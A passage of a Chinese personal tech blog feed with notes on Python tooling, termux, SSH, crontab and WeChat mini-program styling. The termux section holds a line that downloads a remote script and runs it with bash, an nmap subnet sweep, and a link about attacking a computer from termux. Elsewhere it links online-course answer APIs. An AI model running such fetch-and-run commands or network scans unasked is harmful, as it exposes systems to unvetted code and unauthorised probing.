class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple XXX(包名)</span><br><span class="line">E:\Python-path&gt;python.exe -m pip install --upgrade pip //pip更新</span><br></pre></td></tr></table></figure><p>国内源（新版ubuntu要求使用https源，要注意。）：<br>清华：<a href="https://pypi.tuna.tsinghua.edu.cn/simple%EF%BC%88%E6%AF%94%E8%BE%83%E5%B8%B8%E7%94%A8%EF%BC%8C%E4%BA%B2%E6%B5%8B%E9%80%9F%E5%BA%A6%E5%BE%88%E5%BF%AB%EF%BC%89">https://pypi.tuna.tsinghua.edu.cn/simple（比较常用，亲测速度很快）</a><br>阿里云：<a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a><br>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple/">https://pypi.mirrors.ustc.edu.cn/simple/</a><br>华中理工大学：<a href="http://pypi.hustunique.com/">http://pypi.hustunique.com/</a><br>山东理工大学：<a href="http://pypi.sdutlinux.org/">http://pypi.sdutlinux.org/</a> <br>豆瓣：<a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></p><p>模块库：<br><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#autopy">https://www.lfd.uci.edu/~gohlke/pythonlibs/#autopy</a></p><hr><h3 id="Selenium"><a href="#Selenium" class="headerlink" title="Selenium"></a>Selenium</h3><h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>一个用于Web应用程序测试的工具。测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE（7, 8, 9, 10, 11），Firefox，Safari，Chrome，Opera等。</p><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>(1) pip安装selenium模块库：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">win: pip install --upgrade selenium</span><br><span class="line">liunx: pip3 install --upgrade selenium</span><br></pre></td></tr></table></figure><p>(2) 安装ChromeDriver(selenium使用Chrome)<br>ChromeDriver: <a href="http://npm.taobao.org/mirrors/chromedriver/">http://npm.taobao.org/mirrors/chromedriver/</a><br>或 <a href="http://chromedriver.storage.googleapis.com/index.html">http://chromedriver.storage.googleapis.com/index.html</a><br>Firefox：<a href="https://github.com/mozilla/geckodriver/releases">https://github.com/mozilla/geckodriver/releases</a></p><p>(3) 将解压后的文件放入合适的位置.<br>win: 将解压后的文件放入配置了环境变量的文件夹, 如python的文件夹.<br>linux: 将解压后的文件移动到/usr/loacl/bin目录中.</p><p>chrome有界面运行：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> werdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">driver = webdriver.Chrome()     <span class="comment"># 创建Chrome对象.</span></span><br><span class="line"><span class="comment"># 操作这个对象.</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)     <span class="comment"># get方式访问百度.</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">driver.quit()   <span class="comment"># 使用完, 记得关闭浏览器, 不然chromedriver.exe进程为一直在内存中.</span></span><br></pre></td></tr></table></figure><p>chrome无界面运行：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据chrome浏览器2017年发布的新特性,</span></span><br><span class="line"><span class="string">    需要unix版本的chrome版本高于57,</span></span><br><span class="line"><span class="string">    windows版本的chrome版本高于58,</span></span><br><span class="line"><span class="string">    才能使用无界面运行.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">chrome_opt = Options()      <span class="comment"># 创建参数设置对象.</span></span><br><span class="line">chrome_opt.add_argument(<span class="string">&#x27;--headless&#x27;</span>)   <span class="comment"># 无界面化.</span></span><br><span class="line">chrome_opt.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)    <span class="comment"># 配合上面的无界面化.</span></span><br><span class="line">chrome_opt.add_argument(<span class="string">&#x27;--window-size=1366,768&#x27;</span>)   <span class="comment"># 设置窗口大小, 窗口大小会有影响.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Chrome对象并传入设置信息.</span></span><br><span class="line">driver = webdriver.Chrome(chrome_options=chrome_opt)        </span><br><span class="line"><span class="comment"># 操作这个对象.</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)     <span class="comment"># get方式访问百度.</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(driver.page_source)       <span class="comment"># 打印加载的page code, 证明(prove) program is right.</span></span><br><span class="line">driver.quit()   <span class="comment"># 使用完, 记得关闭浏览器, 不然chromedriver.exe进程为一直在内存中.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Selenium WebDriver API 官方参考：<a href="http://seleniumhq.github.io/selenium/docs/api/py/">http://seleniumhq.github.io/selenium/docs/api/py/</a><br>具体API文档地址：<a href="https://seleniumhq.github.io/selenium/docs/api/py/api.html">https://seleniumhq.github.io/selenium/docs/api/py/api.html</a></p><hr><h3 id="uiautomator2"><a href="#uiautomator2" class="headerlink" title="uiautomator2"></a>uiautomator2</h3><p>模拟手机操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade uiautomator2 //或者：(git <span class="built_in">clone</span> https://github.com/openatx/uiautomator2 ||pip install pillow)</span><br><span class="line">pip install --upgrade weditor  //可视化UI查看器</span><br><span class="line">pip install opencv-python  //简单图像处理（根据自己的情况选择是否安装此模块）</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start adb  //启动adb</span><br><span class="line">adb devices//查看电脑是否连接到手机</span><br><span class="line">python3 -m weditor//启动weditor</span><br></pre></td></tr></table></figure><p><img src="https://q0o0p.top/2020/03/09/Python/1.png"><br>手机会自动安装：<br>ATX</p><hr><h2 id="python图片中的文字识别"><a href="#python图片中的文字识别" class="headerlink" title="python图片中的文字识别"></a>python图片中的文字识别</h2><h3 id="Tesseract-OCR"><a href="#Tesseract-OCR" class="headerlink" title="Tesseract-OCR"></a>Tesseract-OCR</h3><p><a href="https://github.com/tesseract-ocr/tesseract">https://github.com/tesseract-ocr/tesseract</a><br>一款由HP实验室开发由Google维护的开源OCR（Optical Character Recognition , 光学字符识别）引擎，特点是开源，免费，支持多语言，多平台。</p><p>PIL是python平台事实上的图像处理标准库，但PIL仅支持到python2.7，加上年久失修，于是在PIL的基础上创建了兼容的版本pillow,支持最新的python3.X。<br>最后autopy3 手动安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install pillow</span><br><span class="line">pip install pytesser3</span><br><span class="line">pip install pytesseract</span><br><span class="line">pip install wheel</span><br></pre></td></tr></table></figure><p>tesseract-ocr<br><a href="https://github.com/tesseract-ocr">https://github.com/tesseract-ocr</a><br><a href="https://github.com/UB-Mannheim/tesseract/wiki">https://github.com/UB-Mannheim/tesseract/wiki</a><br>语言包：<br><a href="https://tesseract-ocr.github.io/tessdoc/Data-Files">https://tesseract-ocr.github.io/tessdoc/Data-Files</a></p><h5 id="图片识别"><a href="#图片识别" class="headerlink" title="图片识别"></a>图片识别</h5><p>cmd执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tesseract test.jpg result -l chi_sim   //生成result.txt（tesseract 图片名称   生成的结果文件的名称 字库）</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im=Image.<span class="built_in">open</span>(<span class="string">r&#x27;F:\code\python\人工智障\1.png&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(im,lang=<span class="string">&#x27;chi_sim&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="jTessBoxEditor"><a href="#jTessBoxEditor" class="headerlink" title="jTessBoxEditor"></a>jTessBoxEditor</h4><p>智能图片识别软件的训练框架<br><a href="https://sourceforge.net/projects/vietocr/files/jTessBoxEditor/">https://sourceforge.net/projects/vietocr/files/jTessBoxEditor/</a><br><a href="https://www.cnblogs.com/wzben/p/5930538.html">https://www.cnblogs.com/wzben/p/5930538.html</a></p><p>E:\Python-path\jTessBoxEditorFX-2.3.0\jTessBoxEditorFX</p><p>分别是字体坐标，和文字宽高，还有图片序号</p><h5 id="用途："><a href="#用途：" class="headerlink" title="用途："></a>用途：</h5><p><a href="https://blog.csdn.net/qq_38844326/article/details/78578892?depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2&amp;utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2">https://blog.csdn.net/qq_38844326/article/details/78578892?depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2&amp;utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2</a></p><hr><h3 id="baidu-aip"><a href="#baidu-aip" class="headerlink" title="baidu-aip"></a>baidu-aip</h3><p>百度提供的图像识别接口来实现简单的图片文字提取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install baidu-aip</span><br></pre></td></tr></table></figure><p>API文档：<br><a href="https://cloud.baidu.com/doc/OCR/s/zk3h7xz52">https://cloud.baidu.com/doc/OCR/s/zk3h7xz52</a></p><hr><p>参考链接:</p><p>Selenium: <a href="https://blog.csdn.net/One_of_them/article/details/82560880">https://blog.csdn.net/One_of_them/article/details/82560880</a><br>超详细版：<a href="https://blog.csdn.net/lintyleo/article/details/79361182?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2">https://blog.csdn.net/lintyleo/article/details/79361182?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2</a></p><p>uiautomator2:<br><a href="https://testerhome.com/topics/12521">https://testerhome.com/topics/12521</a><br>Tesseract:<br><a href="https://blog.csdn.net/m0_37215794/article/details/81944027">https://blog.csdn.net/m0_37215794/article/details/81944027</a><br><a href="https://blog.csdn.net/qq_38844326/article/details/78578892?depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2&amp;utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2">https://blog.csdn.net/qq_38844326/article/details/78578892?depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2&amp;utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2</a><br><a href="https://blog.csdn.net/makesibushuohua/article/details/52058310?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4">https://blog.csdn.net/makesibushuohua/article/details/52058310?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4</a><br><a href="https://blog.csdn.net/qq_38844326/article/details/78143180?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158651165119724848305483%2522%252C%2522scm%2522%253A%252220140713.130056874..%2522%257D&amp;request_id=158651165119724848305483&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task-blog-blog_SOOPENSEARCH-3">https://blog.csdn.net/qq_38844326/article/details/78143180?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158651165119724848305483%2522%252C%2522scm%2522%253A%252220140713.130056874..%2522%257D&amp;request_id=158651165119724848305483&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task-blog-blog_SOOPENSEARCH-3</a><br>baidu-aip:<br><a href="https://blog.csdn.net/weixin_44638960/article/details/99174211">https://blog.csdn.net/weixin_44638960/article/details/99174211</a><br>提取Word中的图片:<br><a href="https://blog.csdn.net/qq_15969343/article/details/81673970?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5">https://blog.csdn.net/qq_15969343/article/details/81673970?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>termux的正确使用</title>
      <link href="/2020/03/05/termux/"/>
      <url>/2020/03/05/termux/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>平板就能连接电脑，能搭建博客，WordPress，hexo。。。<br>大半夜写博客的我，美滋滋<br>O(∩<em>∩)O哈哈~</em>)</p><hr><h2 id="termux-简单用法"><a href="#termux-简单用法" class="headerlink" title="termux 简单用法"></a>termux 简单用法</h2><p>设置默认编辑器<br>export EDITOR=nano 或<br>export EDITOR=vim (若未安装vim,先安装：pkg install vim)<br>编辑源文件<br>apt edit-sources<br>将原来的<a href="https://termux.net官方源替换为/">https://termux.net官方源替换为</a><br><a href="http://mirrors.tuna.tsinghua.edu.cn/termux">http://mirrors.tuna.tsinghua.edu.cn/termux</a></p><p>termux用法写的不错<br><a href="https://www.sqlsec.com/2018/05/termux.html#toc-heading-79">https://www.sqlsec.com/2018/05/termux.html#toc-heading-79</a><br>电脑ssh连接手机上的termux：<br><a href="https://www.jianshu.com/p/2e6c8152a2ba">https://www.jianshu.com/p/2e6c8152a2ba</a></p><hr><h2 id="openssh远程连接"><a href="#openssh远程连接" class="headerlink" title="openssh远程连接"></a>openssh远程连接</h2><p>当使用ssh命令登录到远程系统时，OpenSSH服务器的sshd守护进行将会发送一个公钥，OpenSSH客户端软件ssh将会提示用户确认是否接收发送的公钥。<br>同时，OpenSSH客户端也会向服务器回传一个密钥，使OpenSSH连接双方的每个系统都拥有对方的密钥，因而能够解密对方经由加密链路发送的加密数据。</p><p>当主机中开启openssh服务时，那么就对外开放了远程连接的接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssh服务的服务端：  sshd</span><br><span class="line">openssh服务的客户端：  ssh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net start sshd  //启动ssh连接</span><br><span class="line">Set-Service sshd -StartupType Automatic  //开机自动启动ssh连接</span><br><span class="line">mkdir .ssh //配置ssh连接</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulp //windows查看服务的端口</span><br><span class="line"></span><br><span class="line">ifconfig  //查询termux的ip</span><br><span class="line">whoami  //查询用户名</span><br></pre></td></tr></table></figure><p>ssh -T -i C:\Users\abc.ssh\id_rsa <a href="mailto:&#115;&#109;&#x30;&#x31;&#x40;&#49;&#48;&#46;&#x32;&#51;&#x30;&#x2e;&#49;&#51;&#x35;&#46;&#x34;&#x34;">&#115;&#109;&#x30;&#x31;&#x40;&#49;&#48;&#46;&#x32;&#51;&#x30;&#x2e;&#49;&#51;&#x35;&#46;&#x34;&#x34;</a><br>即用i指定私钥，则连接成功</p><p>1、本地文件拷贝到远程主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# scp anaconda-ks.cfg root@192.168.112.131:/tmp</span><br><span class="line">root@192.168.112.131&#x27;s password: </span><br><span class="line">anaconda-ks.cfg                                         100% 1704     1.7KB/s   00:00</span><br></pre></td></tr></table></figure><p>2、远程主机文件拷贝到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# scp  root@192.168.112.130:/tmp/anaconda-ks.cfg  /root</span><br><span class="line">root@192.168.112.130&#x27;s password: </span><br><span class="line">anaconda-ks.cfg                   100% 1704     1.7KB/s   00:00 </span><br></pre></td></tr></table></figure><h2 id="termux连接电脑"><a href="#termux连接电脑" class="headerlink" title="termux连接电脑"></a>termux连接电脑</h2><p>将手机上的rsa_id.pub上传到电脑上的.ssh文件夹下,改名为authorized_keys.<br>termmux中执行以下命令连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh q0o0p@192.168.1.xxx</span><br></pre></td></tr></table></figure><hr><h2 id="adb"><a href="#adb" class="headerlink" title="adb"></a>adb</h2><ul><li><p>安装脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install wget &amp;&amp; wget https://github.com/MasterDevX/Termux-ADB/raw/master/InstallTools.sh &amp;&amp; bash InstallTools.sh</span><br></pre></td></tr></table></figure><p><img src="https://q0o0p.top/2020/03/05/termux/1.jpg"></p></li><li><p>termux运行adb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb start-server</span><br></pre></td></tr></table></figure></li></ul><p>远程连接数据库<br><img src="https://q0o0p.top/2020/03/05/termux/2.png"></p><hr><h2 id="nmap正确使用"><a href="#nmap正确使用" class="headerlink" title="nmap正确使用"></a>nmap正确使用</h2><p>探测路由下0-24网段的ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sP 192.168.1.0/24  // -sP -script discovery 能获取更多信息</span><br></pre></td></tr></table></figure><hr><h2 id="python定时脚本"><a href="#python定时脚本" class="headerlink" title="python定时脚本"></a>python定时脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pkg install cronie <span class="comment">#    安装crontab</span></span><br><span class="line">termux-wake-lock <span class="comment">#允许termux定时启动</span></span><br><span class="line">crond <span class="comment">#其次开启crontab</span></span><br><span class="line">crontab -e <span class="comment">#添加定时任务</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意:</p><ol><li>请保持termux后台一直在运行，否则会失效。</li><li>并且这个软件似乎并不怎么费电。</li><li>如果定时任务没有执行，可能是crond服务没有开启，再执行一遍crond即可。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>crontab使用实例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">分 时 日 月 周</span><br><span class="line">示例：</span><br><span class="line">0 4  * * 0     root emerge --sync &amp;&amp; emerge -uD world              <span class="comment">#每周日凌晨4点，更新系统</span></span><br><span class="line">0 2 1 * *     root   rm -f /tmp/*                                                    <span class="comment">#每月1号凌晨2点，清理/tmp下的文件</span></span><br><span class="line">0 8 6 5 *   root     mail  robin &lt; /home/galeki/happy.txt             <span class="comment">#每年5月6日给robin发信祝他生日快乐</span></span><br><span class="line">假如，我想每隔2分钟就要执行某个命令，或者我想在每天的6点、12点、18点执行命令，诸如此类的周期，可以通过 “ / ” 和 “ , ” 来设置：</span><br><span class="line">*/2   *   *   *   *           root      ...............      <span class="comment">#每两分钟就执行........</span></span><br><span class="line">0 6,12,18   *   *   *    root      ...............      <span class="comment">#每天6点、12点、18点执行........</span></span><br><span class="line">每两个小时</span><br><span class="line">0 */2 * * * <span class="built_in">echo</span> <span class="string">&quot;have a break now.&quot;</span> &gt;&amp;gt; /tmp/test.txt</span><br><span class="line">晚上11点到早上8点之间每两个小时，早上八点</span><br><span class="line">0 23-7/2，8 * * * <span class="built_in">echo</span> <span class="string">&quot;have a good dream：）&quot;</span> &amp;gt;&amp;gt; /tmp/test.txt</span><br><span class="line">每个月的4号与每个礼拜的礼拜一到礼拜三的早上11点</span><br><span class="line">0 11 4 * 1-3 <span class="built_in">command</span> line</span><br><span class="line">1月1日早上4点</span><br><span class="line">0 4 1 1 * <span class="built_in">command</span> line</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>参考：<br><a href="https://www.52pojie.cn/thread-1124467-1-1.html">https://www.52pojie.cn/thread-1124467-1-1.html</a><br>termux攻击电脑：<br><a href="http://www.nctry.com/1764.html">http://www.nctry.com/1764.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>applet of WeChat(微信小程序常见问题)</title>
      <link href="/2020/02/29/applet/"/>
      <url>/2020/02/29/applet/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>微信小程序官网：<br><a href="https://developers.weixin.qq.com/miniprogram/dev/reference/configuration/app.html#%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE">https://developers.weixin.qq.com/miniprogram/dev/reference/configuration/app.html#%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE</a></p><p>微信公众号开发：<br><a href="https://developers.weixin.qq.com/doc/offiaccount/User_Management/Configuring_user_notes.html">https://developers.weixin.qq.com/doc/offiaccount/User_Management/Configuring_user_notes.html</a></p><hr><h3 id="1-app-json文件解析错误"><a href="#1-app-json文件解析错误" class="headerlink" title="1. app.json文件解析错误"></a>1. app.json文件解析错误</h3><p>1.png</p><hr><h2 id="js-脚本文件"><a href="#js-脚本文件" class="headerlink" title=".js 脚本文件"></a>.js 脚本文件</h2><p>console.log()    //函数中打印日志记录</p><hr><h2 id="json-配置文件"><a href="#json-配置文件" class="headerlink" title=".json 配置文件"></a>.json 配置文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;disableScroll&quot;: false   //不允许滑块滑动</span><br><span class="line">&quot;enablePullDownRefresh&quot;: true //下拉刷新</span><br></pre></td></tr></table></figure><p>color-table chrome插件</p><h2 id="wmxl视图文件"><a href="#wmxl视图文件" class="headerlink" title=".wmxl视图文件"></a>.wmxl视图文件</h2><p><text> </text> 表示文本，只能包含存文本，其他会被忽略（例如：链接）<br>==：判断内容<br>=== ：判断内容和类型<br>bindtap：设置事件处理函数<br>hidden:控制元素是否隐藏（”true” or “false”）<br>data-:自定义的组件（data-user-name=”user”），事件触发的时候封装在事件对象中传递给对应的事件处理函数进行处理</p><p><image></image> 表示图片<br>src:””  :指定属性，加载和显示网页上任意一张图片<br>mode:”” :图片裁剪，缩放模式<br>|:-|:-|<br>|aspectFit|保持图片宽高比例完全缩放，长边完全显示  |<br>|aspectFill|保持图片宽高比例完全缩放，短边完全显示，长边被截取|</p><div></div> 容器元素，在wmxl中类似的用<view> </view>（封装）<p>height: 100vh;  //页面视口的100%<br>display: block  //分块<br>text-align: center;//居中</p><p>iphone6 : px:rpx =1:2<br>open-type=”redirect”(不可返回的)  “navigate”（可返回的）</p><i-input type="text" title="账号" placeholder ="手机号/邮箱"/><i-input type="password" title="密码" placeholder="密码"/>---<h2 id="wxss-样式表文件"><a href="#wxss-样式表文件" class="headerlink" title=".wxss 样式表文件"></a>.wxss 样式表文件</h2><p> flex-direction: column;  /<em>从上往下</em>/<br>  justify-content: space-around; /<em>垂直方向上均匀分布</em>/<br>  align-items: center; //居中<br>  font-size: 100rpx;  //字体大小<br>  height: 100vh;  //宽度vw<br>  animation: wave 10s linear infinite;//动画标签<br>设置两水波运动的效果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">  .containter&#123;</span><br><span class="line">  <span class="attr">background</span>: rgb(<span class="number">149</span>, <span class="number">247</span>, <span class="number">242</span>); <span class="comment">//背景颜色</span></span><br><span class="line">  height: 100vh;  <span class="comment">//高度</span></span><br><span class="line">&#125;</span><br><span class="line">.wave&#123;</span><br><span class="line">  <span class="attr">position</span>: absolute;</span><br><span class="line">  z-index: <span class="number">3</span>;</span><br><span class="line">  right: <span class="number">0</span>;</span><br><span class="line">  bottom: <span class="number">0</span>;</span><br><span class="line">  opacity: <span class="number">0.725</span>;</span><br><span class="line">  height: 260rpx;</span><br><span class="line">  width: 2250rpx;</span><br><span class="line">  animation: wave 10s linear infinite;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.wave-bg&#123;</span><br><span class="line">  z-index: <span class="number">1</span>;</span><br><span class="line">  animation: wave-bg <span class="number">10.</span>25s linear infinite;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes wave&#123;</span><br><span class="line">  <span class="keyword">from</span>&#123;<span class="attr">transform</span>: translate3d(125rpx,<span class="number">0</span>,<span class="number">0</span>)&#125;</span><br><span class="line">  to&#123;<span class="attr">transform</span>: translate3d(1125rpx,<span class="number">0</span>,<span class="number">0</span>)&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@keyframes wave-bg&#123;</span><br><span class="line">  <span class="keyword">from</span>&#123;<span class="attr">transform</span>: translate3d(375rpx,<span class="number">0</span>,<span class="number">0</span>)&#125;</span><br><span class="line">  to&#123;<span class="attr">transform</span>: translate3d(1375rpx,<span class="number">0</span>,<span class="number">0</span>)&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>接口<br><a href="https://wk.92e.win/wkapi.php?q=">https://wk.92e.win/wkapi.php?q=</a><br><a href="https://www.98api.cn/api/tiku.php">https://www.98api.cn/api/tiku.php</a><br><a href="https://wangke.vvhan.com/">https://wangke.vvhan.com/</a><br><a href="http://www.mgxfd.club:2020/?fromGroup=1048080170&amp;prefix=wkct&amp;msg=">http://www.mgxfd.club:2020/?fromGroup=1048080170&amp;prefix=wkct&amp;msg=</a></p><p>慢慢琢磨：<br><a href="https://github.com/linstasn/chaoxing-MOOC-beta">https://github.com/linstasn/chaoxing-MOOC-beta</a><br><a href="https://github.com/Fckay/wangke">https://github.com/Fckay/wangke</a></p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=718089&amp;specialtype=reward">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=718089&amp;specialtype=reward</a></p><hr><p>实现搜索关键词高亮：<br><a 